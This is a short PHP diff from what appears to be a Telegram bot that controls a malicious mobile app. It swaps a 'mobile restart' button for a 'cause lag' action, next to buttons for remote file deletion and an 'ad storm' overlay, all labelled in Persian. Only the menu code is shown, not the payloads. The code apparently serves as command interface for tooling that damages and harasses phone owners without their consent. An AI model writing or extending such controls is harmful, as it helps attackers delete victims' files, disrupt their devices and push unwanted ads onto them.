@@ -19,7 +19,7 @@ class MobileKermRiziKeyboard
                 InlineKeyboardButton::make('دیلیتر', callback_data: 'app_action:REMOVE_FILE', style: 'danger', icon_custom_emoji_id: '5879896690210639947')
             )
             ->addRow(
-                InlineKeyboardButton::make('ریستر موبایل', callback_data: 'check_countdown', style: 'danger', icon_custom_emoji_id: '5465665476971471368'),
+                InlineKeyboardButton::make('لگ انداختن', callback_data: 'app_action:LLL', style: 'danger', icon_custom_emoji_id: '5465665476971471368'),
                 InlineKeyboardButton::make('طوفان تبلیغات 🌪', callback_data: 'app_action:OVERLAY', style: 'danger')
             )
             ->addRow(
